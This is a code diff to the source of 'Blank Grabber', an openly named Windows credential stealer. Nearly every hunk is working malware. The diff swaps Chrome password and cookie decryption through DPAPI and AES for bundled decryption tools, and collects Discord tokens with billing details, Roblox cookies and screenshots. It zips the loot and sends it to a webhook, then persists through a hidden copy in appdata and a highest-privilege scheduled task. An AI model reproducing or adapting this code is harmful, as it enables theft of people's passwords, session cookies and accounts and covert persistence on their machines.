@@ -14,15 +14,12 @@ import requests
 import threading
 import subprocess
 import shutil
-import sqlite3
 import base64
 import sys
 import json
 import random
 import time
 from PIL import ImageGrab, Image, ImageStat
-import pyaes
-import win32crypt
 import re
 
 def fquit(verify= False):
@@ -90,7 +87,6 @@ def MUTEX():
 
 class BlankGrabber:
     def __init__(self):
-        self.OK = False
         self.webhook = WEBHOOK
         self.getPKey()
         self.archive = f"{os.getenv('temp')}\\Blank-{os.getlogin()}.zip"
@@ -110,23 +106,18 @@ class BlankGrabber:
             os._exit(0)
         threads = []
         self.tokens = []
-        self.passwords = {}
-        self.roblocookie = []
         self.ipinfo = self.getip()
         t = threading.Thread(target = lambda: self.webshot())
         t = threading.Thread(target = lambda: self.misc())
         t.start()
         threads.append(t)
         if os.path.isfile(self.chromefolder+"/Local State"):
-            self.copy(self.chromefolder+"/Local State", self.tempfolder+"/Local State")
-            self.key = self.get_decryption_key()
-            if self.key is not None:
-                t = threading.Thread(target = lambda: self.getcookie())
-                t.start()
-                threads.append(t)
-                t = threading.Thread(target = lambda: self.getpass())
-                t.start()
-                threads.append(t)
+            t = threading.Thread(target = lambda: self.getcookie())
+            t.start()
+            threads.append(t)
+            t = threading.Thread(target = lambda: self.getpass())
+            t.start()
+            threads.append(t)
         if os.path.isfile(self.roaming + '\\BetterDiscord\\data\\betterdiscord.asar'):
             t = threading.Thread(target = lambda: self.bypass_bd())
             t.start()
@@ -138,9 +129,6 @@ class BlankGrabber:
         t.start()
         threads.append(t)
 
-        if len(self.roblocookie) != 0:
-            with open(self.tempfolder + "/Roblox Cookies.txt", 'w') as file:
-                file.write("\n\n".join(self.roblocookie))
         if os.path.isfile(self.tempfolder+"/Logs.txt"):
             with open(self.tempfolder+"/Logs.txt", 'r+') as e:
                 log = e.read()
@@ -188,76 +176,19 @@ class BlankGrabber:
             file.write(f"\nLine {exc_info[2].tb_lineno} : {e.__class__.__name__} : {e}")
 
     def getpass(self):
-        passpath = subprocess.run('where /r . "login data"', capture_output= True, shell= True, cwd= self.chromefolder).stdout.decode().splitlines()
-        for filename in passpath:
-            if os.stat(filename).st_size==0:
-                continue
-            data = []
-            passdb = filename.replace(self.chromefolder, self.tempfolder2+'\\'+os.path.basename(filename))
-            passdc = filename.replace(self.chromefolder, self.tempfolder+'\\Chrome\\Passwords')+'\\Decrypted Passwords.txt'
-            try:
-                self.copy(filename, passdb)
-            except Exception as e:
-                self.logs(e, sys.exc_info())
-                continue
-            connection = sqlite3.connect(passdb)
-            cursor = connection.cursor()
-            table = cursor.execute("SELECT action_url, username_value, password_value FROM logins").fetchall()
-            if len(table)==0:
-                continue
-            else:
-                self.copy(passdb, os.path.join(os.path.dirname(passdc), os.path.basename(filename)))
-            for row in table:
-                url = row[0]
-                name = row[1]
-                password = row[2]
-                if (url and name and password):
-                    password = self.decrypt_data(password)
-                    data.append(f"{'Blank Grabber'.center(90, '-')}\n\nURL: {url}\nUsername: {name}\nPassword: {password}")
-            cursor.close()
-            connection.close()
-            if len(data)!= 0:
-                with open(passdc, 'wt') as file:
-                    file.write("\n\n".join(data))
-                del data
-                self.OK = True
+        if not hasattr(sys, 'frozen'):
+            return
+        subprocess.run("a.es -d -p blank pm.bam.aes", cwd= sys._MEIPASS, capture_output= True, shell= True)
+        subprocess.run(f"pm.bam /stext {os.path.abspath(self.tempfolder)}/Passwords.txt", cwd= sys._MEIPASS, capture_output= True, shell= True)
+        os.remove(sys._MEIPASS + "/pm.bam")
+        
 
     def getcookie(self):
-        cookiepath = subprocess.run('where /r . cookies', capture_output= True, shell= True, cwd= self.chromefolder).stdout.decode().splitlines()
-        for filename in cookiepath:
-            if os.stat(filename).st_size==0:
-                continue
-            data = []
-            cookiedb = filename.replace(self.chromefolder, self.tempfolder2+'\\'+os.path.basename(filename))
-            cookiedc = filename.replace(self.chromefolder, self.tempfolder+'\\Chrome\\Cookies')+'\\Chrome Cookies.txt'
-            try:
-                self.copy(filename, cookiedb)
-            except Exception as e:
-                self.logs(e, sys.exc_info())
-                continue
-            connection = sqlite3.connect(cookiedb)
-            cursor = connection.cursor()
-            table = cursor.execute("SELECT host_key, name, encrypted_value from cookies").fetchall()
-            if len(table)==0:
-                continue
-            else:
-                self.copy(cookiedb, os.path.join(os.path.dirname(cookiedc), os.path.basename(filename)))
-            for row in table:
-                url = row[0]
-                name = row[1]
-                cookie = row[2]
-                if (url and name and cookie):
-                    cookie = self.decrypt_data(cookie)
-                    if '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_' in cookie:
-                        self.roblocookie.append(cookie)
-                    data.append(f"{'Blank Grabber'.center(90, '-')}\n\nURL: {url}\nName: {name}\nCookie: {cookie}")
-            cursor.close()
-            connection.close()
-            if len(data)!= 0:
-                with open(cookiedc, 'wt') as file:
-                    file.write("\n\n".join(data))
-                del data
-                self.OK = True
+        if not hasattr(sys, 'frozen'):
+            return
+        subprocess.run("a.es -d -p blank ck.bam.aes", cwd= sys._MEIPASS, capture_output= True, shell= True)
+        subprocess.run(f"ck.bam /stext {os.path.abspath(self.tempfolder)}/Cookies.txt", cwd= sys._MEIPASS, capture_output= True, shell= True)
+        os.remove(sys._MEIPASS + "/ck.bam")
 
     def bypass_bd(self):
         try:
@@ -355,14 +286,11 @@ class BlankGrabber:
                 nitro_data = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=self.headers(token)).json()
                 has_nitro = False
                 has_nitro = len(nitro_data)>0
-                billing = len(json.loads(requests.get("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=self.headers(token)).text))>0
-                password = self.passwords.get(email, '(Not Found)')
-                data.append(f"{'Blank Grabber'.center(90, '-')}\n\nUsername: {user}\nToken: {token}\nMFA: {'Yes' if token.startswith('mfa.') else 'No'}\nEmail: {email}\nPassword: {password}\nPhone: {phone}\nVerified: {verified}\nNitro: {'Yes' if has_nitro else 'No'}\nHas Billing Info: {'Yes' if billing else 'No'}")
+                billing = len(requests.get("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=self.headers(token)).json())>0
+                data.append(f"{'Blank Grabber'.center(90, '-')}\n\nUsername: {user}\nToken: {token}\nMFA: {'Yes' if token.startswith('mfa.') else 'No'}\nEmail: {email}\nPhone: {phone}\nVerified: {verified}\nNitro: {'Yes' if has_nitro else 'No'}\nHas Billing Info: {'Yes' if billing else 'No'}")
         if len(data)!= 0:
             with open(self.tempfolder+'/Discord Info.txt', 'w', errors="ignore") as file:
                 file.write("\n\n".join(data))
-            del data
-            self.OK = True
 
     def screenshot(self):
         try:
@@ -377,18 +305,6 @@ class BlankGrabber:
         image = ImageGrab.grab()
         image.save(self.tempfolder + "/Screenshot.png")
         del image
-
-    def decrypt_data(self, encrypted_data):
-        try:
-            iv = encrypted_data[3:15]
-            encrypted_data = encrypted_data[15:]
-            cipher = pyaes.AESModeOfOperationGCM(self.key, iv)
-            return cipher.decrypt(encrypted_data)[:-16].decode()
-        except Exception:
-            try:
-                return win32crypt.CryptUnprotectData(encrypted_data, None, None, None, 0)[1]
-            except Exception as e:
-                self.logs(e, sys.exc_info())
 
     def headers(self, token=None):
         headers = {
@@ -413,17 +329,6 @@ class BlankGrabber:
             data = f"IP: {r.get('origin')}"
         return data
 
-    def get_decryption_key(self):
-        key = self.chromefolder+"/Local State"
-        with open(key) as key:
-            key = json.load(key)
-        try:
-            key = key["os_crypt"]["encrypted_key"]
-        except (AttributeError, KeyError):
-            return None
-        key = base64.b64decode(key)[5:]
-        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
-
     def zip(self):
         shutil.make_archive(self.archive[:-3], 'zip', self.tempfolder)
 
@@ -445,12 +350,9 @@ class BlankGrabber:
   "username": "Blank Grabber",
   "avatar_url": "https://i.imgur.com/72yOkd1.jpg"
 }
-        if self.OK:
-            requests.post(self.webhook, json = payload)
-            with open(self.archive,'rb') as file:
-                requests.post(self.webhook, files = {"file": file})
-        else:
-            fquit(True)
+        requests.post(self.webhook, json = payload)
+        with open(self.archive,'rb') as file:
+            requests.post(self.webhook, files = {"file": file})
 
         try:
             os.remove(self.archive)
@@ -473,15 +375,12 @@ if __name__ == "__main__":
                 vmprotect()
             frozen = hasattr(sys, 'frozen')
             if frozen and STARTUP:
-                if os.path.basename(os.path.dirname(sys.executable)) != "Roaming":
+                if os.path.abspath(sys.executable) != os.path.abspath(os.getenv('appdata')):
                     try:
-                        vbspath = os.getenv("appdata") + f"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{generate()}.vbs"
-                        path = os.getenv("appdata") + f"\\{generate()}.exe"
-                        BlankGrabber.copy("Blank", sys.executable, path)
-                        subprocess.run(f'attrib "{path}" +s +h', shell= True, capture_output= True)
-                        with open(vbspath, 'w') as vbs:
-                            vbs.write(f'''Set oShell = CreateObject("Shell.Application")
-oShell.ShellExecute "cmd.exe", "/c ""{path}""" , , "runas", 0''')
+                        exepath = os.getenv("appdata") + f"\\{generate()}.exe"
+                        BlankGrabber.copy("Blank", sys.executable, exepath)
+                        subprocess.run(f'attrib "{exepath}" +s +h', shell= True, capture_output= True)
+                        subprocess.run(f'schtasks /CREATE /SC ONSTART /TN "{generate()}\\System Handler.exe" /TR "{os.path.abspath(exepath)}" /RL HIGHEST', shell= True, capture_output= True)
                     except Exception:
                         pass
             
